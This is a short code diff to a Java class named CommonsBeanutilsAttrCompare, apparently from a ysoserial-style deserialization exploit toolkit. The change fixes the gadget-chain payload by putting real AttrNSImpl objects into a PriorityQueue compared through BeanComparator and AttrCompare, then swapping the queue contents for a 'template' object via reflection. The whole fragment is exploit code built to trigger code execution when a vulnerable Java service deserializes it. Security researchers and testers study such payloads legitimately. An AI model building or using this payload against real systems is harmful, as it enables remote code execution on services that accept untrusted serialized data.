@@ -21,17 +21,17 @@ public class CommonsBeanutilsAttrCompare implements ObjectPayload<Queue<Object>>
     @Override
     public Queue<Object> getObject(Object template) throws Exception {
 
-//        AttrNSImpl attrNS1 = new AttrNSImpl();
+        AttrNSImpl attrNS1 = new AttrNSImpl();
         CoreDocumentImpl coreDocument = new CoreDocumentImpl();
-//        attrNS1.setValues(coreDocument,"1","1","1");
+        attrNS1.setValues(coreDocument,"1","1","1");
 
         BeanComparator beanComparator = new BeanComparator(null, new AttrCompare());
 
         PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
 
 
-        queue.add("attrNS1");
-        queue.add("attrNS1");
+        queue.add(attrNS1);
+        queue.add(attrNS1);
 
 
         Reflections.setFieldValue(queue, "queue", new Object[] { template, template });
